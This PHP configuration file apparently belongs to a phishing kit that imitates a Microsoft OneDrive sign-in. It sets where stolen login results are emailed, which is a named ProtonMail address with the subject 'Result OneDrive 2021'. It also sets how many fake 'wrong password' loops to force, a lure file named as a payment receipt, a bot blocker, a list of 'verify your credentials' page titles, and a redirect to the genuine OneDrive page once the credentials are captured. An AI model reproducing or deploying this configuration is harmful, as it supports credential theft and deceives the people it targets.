<?php
class Config {

    static public $config = [
        'withParams' => true, // with ?email= or not
        'saveLogs' => true, // save logs to file or not
        'visitor' => true, //save vistors or not
        'loop' => 2, // how many wrong password loop should be
        'subject' => 'Result OneDrive 2021', // your result subject
        'email' => 'timmmytommy22@protonmail.com', // your email result
        'enable_blocker' => false,
        'ip_count' => 5,
        'file_icon' => 'rar.png', // rar.png , pdf.png , word.png
        'file_name' => 'Payment-5512893-rcpt.rar', // dont forget to rename your files too 
        'killbotkey' => '',
        'successLink' => 'https://onedrive.live.com/about/en-us/signin/', // where should i redirect in the end
        'tittle' => array("verify your account",
                            "Verify your identity",
                            "verify your credentials",
                            "verify your informations",
                            "verify your email",
                            "verify your login",
                            "confirm your account",
                            "confirm your identity",
                            "confirm your credentials",
                            "confirm your information",
                            "confirm your email",
                            "confirm your login",
                            "login to your account",
                            "signin to your account",
                            "connect your account"),
    ];

    static public function Get($key)
    {
        return self::$config[$key];
    }

}


